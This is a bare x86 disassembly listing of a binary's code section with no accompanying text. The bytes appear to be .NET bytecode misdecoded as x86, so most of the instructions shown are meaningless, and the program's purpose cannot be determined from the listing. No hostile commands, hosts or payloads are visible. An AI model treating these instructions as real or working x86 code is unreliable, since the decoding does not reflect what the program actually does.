  40465f:	00 0a                	add    %cl,(%edx)
  404661:	dc de                	(bad)
  404663:	03 26                	add    (%esi),%esp
  404665:	de 00                	fiadds (%eax)
  404667:	16                   	push   %ss
  404668:	2a 11                	sub    (%ecx),%dl
  40466a:	05 2a 01 34 00       	add    $0x34012a,%eax
  40466f:	00 02                	add    %al,(%edx)
  404671:	00 19                	add    %bl,(%ecx)
  404673:	00 8b a4 00 0a 00    	add    %cl,0xa00a4(%ebx)
  404679:	00 00                	add    %al,(%eax)
  40467b:	00 02                	add    %al,(%edx)
  40467d:	00 12                	add    %dl,(%edx)
  40467f:	00 9e b0 00 0a 00    	add    %bl,0xa00b0(%esi)
  404685:	00 00                	add    %al,(%eax)
  404687:	00 02                	add    %al,(%edx)
  404689:	00 0b                	add    %cl,(%ebx)
  40468b:	00 b1 bc 00 0a 00    	add    %dh,0xa00bc(%ecx)
  404691:	00 00                	add    %al,(%eax)
  404693:	00 00                	add    %al,(%eax)
  404695:	00 00                	add    %al,(%eax)
  404697:	00 c8                	add    %cl,%al
  404699:	c8 00 03 01          	enter  $0x300,$0x1
  40469d:	00 00                	add    %al,(%eax)
  40469f:	01 1b                	add    %ebx,(%ebx)
  4046a1:	30 02                	xor    %al,(%edx)
  4046a3:	00 1f                	add    %bl,(%edi)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 1a                	add    %bl,(%edx)
  4046a9:	00 00                	add    %al,(%eax)
  4046ab:	11 16                	adc    %edx,(%esi)
  4046ad:	0a 28                	or     (%eax),%ch
  4046af:	88 00                	mov    %al,(%eax)
  4046b1:	00 0a                	add    %cl,(%edx)
  4046b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b4:	b8 00 00 0a 12       	mov    $0x120a0000,%eax
  4046b9:	00 28                	add    %ch,(%eax)
  4046bb:	79 00                	jns    0x4046bd
  4046bd:	00 06                	add    %al,(%esi)
  4046bf:	26 06                	es push %es
  4046c1:	0b de                	or     %esi,%ebx
  4046c3:	05 26 06 0b de       	add    $0xde0b0626,%eax
  4046c8:	00 07                	add    %al,(%edi)
  4046ca:	2a 00                	sub    (%eax),%al
  4046cc:	01 10                	add    %edx,(%eax)
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	02 00                	add    (%eax),%al
  4046d4:	16                   	push   %ss
  4046d5:	18 00                	sbb    %al,(%eax)
  4046d7:	05 01 00 00 01       	add    $0x1000001,%eax
  4046dc:	1b 30                	sbb    (%eax),%esi
  4046de:	01 00                	add    %eax,(%eax)
  4046e0:	23 00                	and    (%eax),%eax
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	1b 00                	sbb    (%eax),%eax
  4046e6:	00 11                	add    %dl,(%ecx)
  4046e8:	72 d1                	jb     0x4046bb
  4046ea:	23 00                	and    (%eax),%eax
  4046ec:	70 28                	jo     0x404716
  4046ee:	78 00                	js     0x4046f0
  4046f0:	00 06                	add    %al,(%esi)
  4046f2:	0a 12                	or     (%edx),%dl
  4046f4:	00 28                	add    %ch,(%eax)
  4046f6:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4046fb:	04 17                	add    $0x17,%al
  4046fd:	0b de                	or     %esi,%ebx
  4046ff:	09 16                	or     %edx,(%esi)
  404701:	0b de                	or     %esi,%ebx
  404703:	05 26 16 0b de       	add    $0xde0b1626,%eax
  404708:	00 07                	add    %al,(%edi)
  40470a:	2a 00                	sub    (%eax),%al
  40470c:	01 10                	add    %edx,(%eax)
  40470e:	00 00                	add    %al,(%eax)
  404710:	00 00                	add    %al,(%eax)
  404712:	00 00                	add    %al,(%eax)
  404714:	1c 1c                	sbb    $0x1c,%al
  404716:	00 05 01 00 00 01    	add    %al,0x1000001
  40471c:	1b 30                	sbb    (%eax),%esi
  40471e:	02 00                	add    (%eax),%al
  404720:	65 00 00             	add    %al,%gs:(%eax)
  404723:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404726:	00 11                	add    %dl,(%ecx)
  404728:	28 8d 00 00 0a 0a    	sub    %cl,0xa0a0000(%ebp)
  40472e:	16                   	push   %ss
  40472f:	0b 2b                	or     (%ebx),%ebp
  404731:	3d 06 07 9a 0c       	cmp    $0xc9a0706,%eax
  404736:	02 08                	add    (%eax),%cl
  404738:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  40473c:	06                   	push   %es
  40473d:	6f                   	outsl  %ds:(%esi),(%dx)
  40473e:	5b                   	pop    %ebx
  40473f:	00 00                	add    %al,(%eax)
  404741:	0a 72 e9             	or     -0x17(%edx),%dh
  404744:	23 00                	and    (%eax),%eax
  404746:	70 6f                	jo     0x4047b7
  404748:	b0 00                	mov    $0x0,%al
  40474a:	00 0a                	add    %cl,(%edx)
  40474c:	2c 18                	sub    $0x18,%al
  40474e:	7e 10                	jle    0x404760
  404750:	00 00                	add    %al,(%eax)
  404752:	04 72                	add    $0x72,%al
  404754:	09 24 00             	or     %esp,(%eax,%eax,1)
  404757:	70 28                	jo     0x404781
  404759:	8d 00                	lea    (%eax),%eax
  40475b:	00 06                	add    %al,(%esi)
  40475d:	26 72 09             	es jb  0x404769
  404760:	24 00                	and    $0x0,%al
  404762:	70 0d                	jo     0x404771
  404764:	de 25 de 03 26 de    	fisubs 0xde2603de
  40476a:	00 07                	add    %al,(%edi)
  40476c:	17                   	pop    %ss
  40476d:	58                   	pop    %eax
  40476e:	0b 07                	or     (%edi),%eax
  404770:	06                   	push   %es
  404771:	8e 69 32             	mov    0x32(%ecx),%gs
  404774:	bd 7e 10 00 00       	mov    $0x107e,%ebp
  404779:	04 72                	add    $0x72,%al
  40477b:	07                   	pop    %es
  40477c:	21 00                	and    %eax,(%eax)
  40477e:	70 28                	jo     0x4047a8
  404780:	8d 00                	lea    (%eax),%eax
  404782:	00 06                	add    %al,(%esi)
  404784:	26 72 07             	es jb  0x40478e
  404787:	21 00                	and    %eax,(%eax)
  404789:	70 2a                	jo     0x4047b5
  40478b:	09 2a                	or     %ebp,(%edx)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	00 01                	add    %al,(%ecx)
  404791:	10 00                	adc    %al,(%eax)
  404793:	00 00                	add    %al,(%eax)
  404795:	00 0e                	add    %cl,(%esi)
  404797:	00 32                	add    %dh,(%edx)
  404799:	40                   	inc    %eax
  40479a:	00 03                	add    %al,(%ebx)
  40479c:	01 00                	add    %eax,(%eax)
  40479e:	00 01                	add    %al,(%ecx)
  4047a0:	1b 30                	sbb    (%eax),%esi
  4047a2:	02 00                	add    (%eax),%al
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	00 1d 00 00 11 72    	add    %bl,0x72110000
  4047ad:	0d 24 00 70 03       	or     $0x3700024,%eax
  4047b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b3:	ba 00 00 0a 0b       	mov    $0xb0a0000,%edx
  4047b8:	12 01                	adc    (%ecx),%al
  4047ba:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  4047c0:	51                   	push   %ecx
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	0a 73 b1             	or     -0x4f(%ebx),%dh
  4047c6:	00 00                	add    %al,(%eax)
  4047c8:	0a 0a                	or     (%edx),%cl
  4047ca:	06                   	push   %es
  4047cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4047cc:	b2 00                	mov    $0x0,%dl
  4047ce:	00 0a                	add    %cl,(%edx)
  4047d0:	0c 08                	or     $0x8,%al
  4047d2:	28 01                	sub    %al,(%ecx)
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	2b 28                	sub    (%eax),%ebp
  4047d8:	02 00                	add    (%eax),%al
  4047da:	00 2b                	add    %ch,(%ebx)
  4047dc:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047e1:	2b 16                	sub    (%esi),%edx
  4047e3:	72 7f                	jb     0x404864
  4047e5:	24 00                	and    $0x0,%al
  4047e7:	70 28                	jo     0x404811
  4047e9:	b5 00                	mov    $0x0,%ch
  4047eb:	00 0a                	add    %cl,(%edx)
  4047ed:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047f2:	2b 05 6f 38 00 00    	sub    0x386f,%eax
  4047f8:	0a 0d de 1d 08 2c    	or     0x2c081dde,%cl
  4047fe:	06                   	push   %es
  4047ff:	08 6f 33             	or     %ch,0x33(%edi)
  404802:	00 00                	add    %al,(%eax)
  404804:	0a dc                	or     %ah,%bl
  404806:	06                   	push   %es
  404807:	2c 06                	sub    $0x6,%al
  404809:	06                   	push   %es
  40480a:	6f                   	outsl  %ds:(%esi),(%dx)
  40480b:	33 00                	xor    (%eax),%eax
  40480d:	00 0a                	add    %cl,(%edx)
  40480f:	dc 26                	fsubl  (%esi)
  404811:	de 00                	fiadds (%eax)
  404813:	72 bd                	jb     0x4047d2
  404815:	20 00                	and    %al,(%eax)
  404817:	70 2a                	jo     0x404843
  404819:	09 2a                	or     %ebp,(%edx)
  40481b:	00 01                	add    %al,(%ecx)
  40481d:	28 00                	sub    %al,(%eax)
  40481f:	00 02                	add    %al,(%edx)
  404821:	00 25 00 2b 50 00    	add    %ah,0x502b00
  404827:	0a 00                	or     (%eax),%al
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 02                	add    %al,(%edx)
  40482d:	00 1e                	add    %bl,(%esi)
  40482f:	00 3c 5a             	add    %bh,(%edx,%ebx,2)
  404832:	00 0a                	add    %cl,(%edx)
	...
  40483c:	64 64 00 03          	fs add %al,%fs:(%ebx)
  404840:	01 00                	add    %eax,(%eax)
  404842:	00 01                	add    %al,(%ecx)
  404844:	1b 30                	sbb    (%eax),%esi
  404846:	04 00                	add    $0x0,%al
  404848:	5f                   	pop    %edi
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 1e                	add    %bl,(%esi)
  40484d:	00 00                	add    %al,(%eax)
  40484f:	11 1b                	adc    %ebx,(%ebx)
  404851:	8d 01                	lea    (%ecx),%eax
  404853:	00 00                	add    %al,(%eax)
  404855:	01 25 16 28 be 00    	add    %esp,0xbe2816
  40485b:	00 0a                	add    %cl,(%edx)
  40485d:	8c 72 00             	mov    %?,0x0(%edx)
  404860:	00 01                	add    %al,(%ecx)
  404862:	a2 25 17 28 bf       	mov    %al,0xbf281725
  404867:	00 00                	add    %al,(%eax)
  404869:	0a a2 25 18 28 c0    	or     -0x3fd7e7db(%edx),%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a a2 25 19 28 c1    	or     -0x3ed7e6db(%edx),%ah
  404877:	00 00                	add    %al,(%eax)
  404879:	0a a2 25 1a 28 aa    	or     -0x55d7e5db(%edx),%ah
  40487f:	00 00                	add    %al,(%eax)
  404881:	0a 28                	or     (%eax),%ch
  404883:	ab                   	stos   %eax,%es:(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 73 ac             	or     -0x54(%ebx),%dh
  404889:	00 00                	add    %al,(%eax)
  40488b:	0a 28                	or     (%eax),%ch
  40488d:	ad                   	lods   %ds:(%esi),%eax
  40488e:	00 00                	add    %al,(%eax)
  404890:	0a 8c 51 00 00 01 a2 	or     -0x5dff0000(%ecx,%edx,2),%cl
  404897:	28 c2                	sub    %al,%dl
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 28                	or     (%eax),%ch
  40489d:	7f 00                	jg     0x40489f
  40489f:	00 06                	add    %al,(%esi)
  4048a1:	0a de                	or     %dh,%bl
  4048a3:	09 26                	or     %esp,(%esi)
  4048a5:	72 97                	jb     0x40483e
  4048a7:	24 00                	and    $0x0,%al
  4048a9:	70 0a                	jo     0x4048b5
  4048ab:	de 00                	fiadds (%eax)
  4048ad:	06                   	push   %es
  4048ae:	2a 00                	sub    (%eax),%al
  4048b0:	01 10                	add    %edx,(%eax)
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	00 00                	add    %al,(%eax)
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	54                   	push   %esp
  4048b9:	54                   	push   %esp
  4048ba:	00 09                	add    %cl,(%ecx)
  4048bc:	01 00                	add    %eax,(%eax)
  4048be:	00 01                	add    %al,(%ecx)
  4048c0:	13 30                	adc    (%eax),%esi
  4048c2:	03 00                	add    (%eax),%eax
  4048c4:	5a                   	pop    %edx
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	00 1f                	add    %bl,(%edi)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	11 73 c3             	adc    %esi,-0x3d(%ebx)
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	0a 28                	or     (%eax),%ch
  4048d2:	c4 00                	les    (%eax),%eax
  4048d4:	00 0a                	add    %cl,(%edx)
  4048d6:	02 6f 21             	add    0x21(%edi),%ch
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	0a 0a                	or     (%edx),%cl
  4048dd:	06                   	push   %es
  4048de:	6f                   	outsl  %ds:(%esi),(%dx)
  4048df:	c5 00                	lds    (%eax),%eax
  4048e1:	00 0a                	add    %cl,(%edx)
  4048e3:	0a 73 53             	or     0x53(%ebx),%dh
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	0a 0b                	or     (%ebx),%cl
  4048ea:	06                   	push   %es
  4048eb:	0c 16                	or     $0x16,%al
  4048ed:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  4048f2:	91                   	xchg   %eax,%ecx
  4048f3:	13 04 07             	adc    (%edi,%eax,1),%eax
  4048f6:	12 04 72             	adc    (%edx,%esi,2),%al
  4048f9:	a9 24 00 70 28       	test   $0x28700024,%eax
  4048fe:	c6 00 00             	movb   $0x0,(%eax)
  404901:	0a 6f 55             	or     0x55(%edi),%ch
  404904:	00 00                	add    %al,(%eax)
  404906:	0a 26                	or     (%esi),%ah
  404908:	09 17                	or     %edx,(%edi)
  40490a:	58                   	pop    %eax
  40490b:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  404910:	32 de                	xor    %dh,%bl
  404912:	07                   	pop    %es
  404913:	6f                   	outsl  %ds:(%esi),(%dx)
  404914:	38 00                	cmp    %al,(%eax)
  404916:	00 0a                	add    %cl,(%edx)
  404918:	16                   	push   %ss
  404919:	1f                   	pop    %ds
  40491a:	14 6f                	adc    $0x6f,%al
  40491c:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  404922:	00 00                	add    %al,(%eax)
  404924:	0a 2a                	or     (%edx),%ch
  404926:	00 00                	add    %al,(%eax)
  404928:	13 30                	adc    (%eax),%esi
  40492a:	07                   	pop    %es
  40492b:	00 b3 01 00 00 20    	add    %dh,0x20000001(%ebx)
  404931:	00 00                	add    %al,(%eax)
  404933:	11 73 62             	adc    %esi,0x62(%ebx)
  404936:	00 00                	add    %al,(%eax)
  404938:	06                   	push   %es
  404939:	25 72 d1 20 00       	and    $0x20d172,%eax
  40493e:	70 6f                	jo     0x4049af
  404940:	4d                   	dec    %ebp
  404941:	00 00                	add    %al,(%eax)
  404943:	06                   	push   %es
  404944:	72 af                	jb     0x4048f5
  404946:	24 00                	and    $0x0,%al
  404948:	70 6f                	jo     0x4049b9
  40494a:	5a                   	pop    %edx
  40494b:	00 00                	add    %al,(%eax)
  40494d:	06                   	push   %es
  40494e:	25 72 c5 24 00       	and    $0x24c572,%eax
  404953:	70 6f                	jo     0x4049c4
  404955:	4d                   	dec    %ebp
  404956:	00 00                	add    %al,(%eax)
  404958:	06                   	push   %es
  404959:	7e 10                	jle    0x40496b
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 6f                	add    $0x6f,%al
  40495f:	5a                   	pop    %edx
  404960:	00 00                	add    %al,(%eax)
  404962:	06                   	push   %es
  404963:	25 72 cf 24 00       	and    $0x24cf72,%eax
  404968:	70 6f                	jo     0x4049d9
  40496a:	4d                   	dec    %ebp
  40496b:	00 00                	add    %al,(%eax)
  40496d:	06                   	push   %es
  40496e:	28 bf 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edi)
  404974:	38 00                	cmp    %al,(%eax)
  404976:	00 0a                	add    %cl,(%edx)
  404978:	6f                   	outsl  %ds:(%esi),(%dx)
  404979:	5a                   	pop    %edx
  40497a:	00 00                	add    %al,(%eax)
  40497c:	06                   	push   %es
  40497d:	25 72 d9 24 00       	and    $0x24d972,%eax
  404982:	70 6f                	jo     0x4049f3
  404984:	4d                   	dec    %ebp
  404985:	00 00                	add    %al,(%eax)
  404987:	06                   	push   %es
  404988:	73 ae                	jae    0x404938
  40498a:	00 00                	add    %al,(%eax)
  40498c:	0a 28                	or     (%eax),%ch
  40498e:	af                   	scas   %es:(%edi),%eax
  40498f:	00 00                	add    %al,(%eax)
  404991:	0a 6f 38             	or     0x38(%edi),%ch
  404994:	00 00                	add    %al,(%eax)
  404996:	0a 72 df             	or     -0x21(%edx),%dh
  404999:	24 00                	and    $0x0,%al
  40499b:	70 14                	jo     0x4049b1
  40499d:	6f                   	outsl  %ds:(%esi),(%dx)
  40499e:	c9                   	leave
  40499f:	00 00                	add    %al,(%eax)
  4049a1:	0a 72 f3             	or     -0xd(%edx),%dh
  4049a4:	24 00                	and    $0x0,%al
  4049a6:	70 28                	jo     0x4049d0
  4049a8:	ca 00 00             	lret   $0x0
  4049ab:	0a 0a                	or     (%edx),%cl
  4049ad:	12 00                	adc    (%eax),%al
  4049af:	28 cb                	sub    %cl,%bl
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	0a 72 f7             	or     -0x9(%edx),%dh
  4049b6:	24 00                	and    $0x0,%al
  4049b8:	70 72                	jo     0x404a2c
  4049ba:	01 25 00 70 6f c9    	add    %esp,0xc96f7000
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	0a 72 0d             	or     0xd(%edx),%dh
  4049c5:	25 00 70 72 19       	and    $0x19727000,%eax
  4049ca:	25 00 70 6f c9       	and    $0xc96f7000,%eax
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	0a 28                	or     (%eax),%ch
  4049d3:	9c                   	pushf
  4049d4:	00 00                	add    %al,(%eax)
  4049d6:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	06                   	push   %es
  4049dc:	25 72 25 25 00       	and    $0x252572,%eax
  4049e1:	70 6f                	jo     0x404a52
  4049e3:	4d                   	dec    %ebp
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	06                   	push   %es
  4049e7:	28 cc                	sub    %cl,%ah
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	06                   	push   %es
  4049f1:	25 72 2f 25 00       	and    $0x252f72,%eax
  4049f6:	70 6f                	jo     0x404a67
  4049f8:	4d                   	dec    %ebp
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	06                   	push   %es
  4049fc:	7e 03                	jle    0x404a01
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	04 6f                	add    $0x6f,%al
  404a02:	5a                   	pop    %edx
  404a03:	00 00                	add    %al,(%eax)
  404a05:	06                   	push   %es
  404a06:	25 72 3f 25 00       	and    $0x253f72,%eax
  404a0b:	70 6f                	jo     0x404a7c
  404a0d:	4d                   	dec    %ebp
  404a0e:	00 00                	add    %al,(%eax)
  404a10:	06                   	push   %es
  404a11:	28 81 00 00 06 0a    	sub    %al,0xa060000(%ecx)
  404a17:	12 00                	adc    (%eax),%al
  404a19:	28 cb                	sub    %cl,%bl
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 6f 5b             	or     0x5b(%edi),%ch
  404a20:	00 00                	add    %al,(%eax)
  404a22:	0a 72 4b             	or     0x4b(%edx),%dh
  404a25:	25 00 70 72 3f       	and    $0x3f727000,%eax
  404a2a:	25 00 70 6f c9       	and    $0xc96f7000,%eax
  404a2f:	00 00                	add    %al,(%eax)
  404a31:	0a 72 55             	or     0x55(%edx),%dh
  404a34:	25 00 70 72 cf       	and    $0xcf727000,%eax
  404a39:	24 00                	and    $0x0,%al
  404a3b:	70 6f                	jo     0x404aac
  404a3d:	c9                   	leave
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a43:	00 00                	add    %al,(%eax)
  404a45:	06                   	push   %es
  404a46:	25 72 61 25 00       	and    $0x256172,%eax
  404a4b:	70 6f                	jo     0x404abc
  404a4d:	4d                   	dec    %ebp
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	06                   	push   %es
  404a51:	72 f9                	jb     0x404a4c
  404a53:	20 00                	and    %al,(%eax)
  404a55:	70 7e                	jo     0x404ad5
  404a57:	10 00                	adc    %al,(%eax)
  404a59:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a5c:	8e 00                	mov    (%eax),%es
  404a5e:	00 06                	add    %al,(%esi)
  404a60:	25 2d 06 26 72       	and    $0x7226062d,%eax
  404a65:	07                   	pop    %es
  404a66:	21 00                	and    %eax,(%eax)
  404a68:	70 28                	jo     0x404a92
  404a6a:	51                   	push   %ecx
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a70:	00 00                	add    %al,(%eax)
  404a72:	06                   	push   %es
  404a73:	25 72 79 25 00       	and    $0x257972,%eax
  404a78:	70 6f                	jo     0x404ae9
  404a7a:	4d                   	dec    %ebp
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	06                   	push   %es
  404a7e:	7e 0e                	jle    0x404a8e
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 6f                	add    $0x6f,%al
  404a84:	5a                   	pop    %edx
  404a85:	00 00                	add    %al,(%eax)
  404a87:	06                   	push   %es
  404a88:	25 72 8b 25 00       	and    $0x258b72,%eax
  404a8d:	70 6f                	jo     0x404afe
  404a8f:	4d                   	dec    %ebp
  404a90:	00 00                	add    %al,(%eax)
  404a92:	06                   	push   %es
  404a93:	28 83 00 00 06 6f    	sub    %al,0x6f060000(%ebx)
  404a99:	5a                   	pop    %edx
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	06                   	push   %es
  404a9d:	25 72 9f 25 00       	and    $0x259f72,%eax
  404aa2:	70 6f                	jo     0x404b13
  404aa4:	4d                   	dec    %ebp
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	06                   	push   %es
  404aa8:	28 cc                	sub    %cl,%ah
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	0a 73 87             	or     -0x79(%ebx),%dh
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	0a 28                	or     (%eax),%ch
  404ab3:	cd 00                	int    $0x0
  404ab5:	00 0a                	add    %cl,(%edx)
  404ab7:	0b 12                	or     (%edx),%edx
  404ab9:	01 28                	add    %ebp,(%eax)
  404abb:	ce                   	into
  404abc:	00 00                	add    %al,(%eax)
  404abe:	0a 0b                	or     (%ebx),%cl
  404ac0:	12 01                	adc    (%ecx),%al
  404ac2:	28 cf                	sub    %cl,%bh
  404ac4:	00 00                	add    %al,(%eax)
  404ac6:	0a 6f 5a             	or     0x5a(%edi),%ch
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	06                   	push   %es
  404acc:	25 72 b3 25 00       	and    $0x25b372,%eax
  404ad1:	70 6f                	jo     0x404b42
  404ad3:	4d                   	dec    %ebp
  404ad4:	00 00                	add    %al,(%eax)
  404ad6:	06                   	push   %es
  404ad7:	72 bd                	jb     0x404a96
  404ad9:	20 00                	and    %al,(%eax)
  404adb:	70 6f                	jo     0x404b4c
  404add:	5a                   	pop    %edx
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	06                   	push   %es
  404ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae2:	57                   	push   %edi
  404ae3:	00 00                	add    %al,(%eax)
  404ae5:	06                   	push   %es
  404ae6:	2a 00                	sub    (%eax),%al
  404ae8:	1b 30                	sbb    (%eax),%esi
  404aea:	02 00                	add    (%eax),%al
  404aec:	43                   	inc    %ebx
  404aed:	00 00                	add    %al,(%eax)
  404aef:	00 00                	add    %al,(%eax)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 7e 0f             	add    %bh,0xf(%esi)
  404af6:	00 00                	add    %al,(%eax)
  404af8:	04 28                	add    $0x28,%al
  404afa:	17                   	pop    %ss
  404afb:	00 00                	add    %al,(%eax)
  404afd:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404b00:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404b06:	05 28 8b 00 00       	add    $0x8b28,%eax
  404b0b:	06                   	push   %es
  404b0c:	28 88 00 00 06 28    	sub    %cl,0x28060000(%eax)
  404b12:	08 00                	or     %al,(%eax)
  404b14:	00 06                	add    %al,(%esi)
  404b16:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b1b:	05 6f 76 00 00       	add    $0x766f,%eax
  404b20:	0a 28                	or     (%eax),%ch
  404b22:	06                   	push   %es
  404b23:	00 00                	add    %al,(%eax)
  404b25:	06                   	push   %es
  404b26:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b2b:	05 28 d3 00 00       	add    $0xd328,%eax
  404b30:	0a de                	or     %dh,%bl
  404b32:	03 26                	add    (%esi),%esp
  404b34:	de 00                	fiadds (%eax)
  404b36:	2a 00                	sub    (%eax),%al
  404b38:	01 10                	add    %edx,(%eax)
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	3f                   	aas
  404b41:	3f                   	aas
  404b42:	00 03                	add    %al,(%ebx)
  404b44:	01 00                	add    %eax,(%eax)
  404b46:	00 01                	add    %al,(%ecx)
  404b48:	1b 30                	sbb    (%eax),%esi
  404b4a:	03 00                	add    (%eax),%eax
  404b4c:	a0 00 00 00 21       	mov    0x21000000,%al
  404b51:	00 00                	add    %al,(%eax)
  404b53:	11 72 bd             	adc    %esi,-0x43(%edx)
  404b56:	25 00 70 28 c0       	and    $0xc0287000,%eax
  404b5b:	00 00                	add    %al,(%eax)
  404b5d:	0a 72 c3             	or     -0x3d(%edx),%dh
  404b60:	25 00 70 28 9c       	and    $0x9c287000,%eax
  404b65:	00 00                	add    %al,(%eax)
  404b67:	0a 72 ef             	or     -0x11(%edx),%dh
  404b6a:	25 00 70 73 d4       	and    $0xd4737000,%eax
  404b6f:	00 00                	add    %al,(%eax)
  404b71:	0a 0a                	or     (%edx),%cl
  404b73:	73 d5                	jae    0x404b4a
  404b75:	00 00                	add    %al,(%eax)
  404b77:	0a 0b                	or     (%ebx),%cl
  404b79:	06                   	push   %es
  404b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7b:	b2 00                	mov    $0x0,%dl
  404b7d:	00 0a                	add    %cl,(%edx)
  404b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b80:	b3 00                	mov    $0x0,%bl
  404b82:	00 0a                	add    %cl,(%edx)
  404b84:	0c 2b                	or     $0x2b,%al
  404b86:	1d 08 6f b4 00       	sbb    $0xb46f08,%eax
  404b8b:	00 0a                	add    %cl,(%edx)
  404b8d:	0d 07 09 72 2d       	or     $0x2d720907,%eax
  404b92:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404b96:	b5 00                	mov    $0x0,%ch
  404b98:	00 0a                	add    %cl,(%edx)
  404b9a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b9b:	38 00                	cmp    %al,(%eax)
  404b9d:	00 0a                	add    %cl,(%edx)
  404b9f:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba0:	d6                   	salc
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	0a 08                	or     (%eax),%cl
  404ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba6:	b7 00                	mov    $0x0,%bh
  404ba8:	00 0a                	add    %cl,(%edx)
  404baa:	2d db de 0a 08       	sub    $0x80adedb,%eax
  404baf:	2c 06                	sub    $0x6,%al
  404bb1:	08 6f 33             	or     %ch,0x33(%edi)
  404bb4:	00 00                	add    %al,(%eax)
  404bb6:	0a dc                	or     %ah,%bl
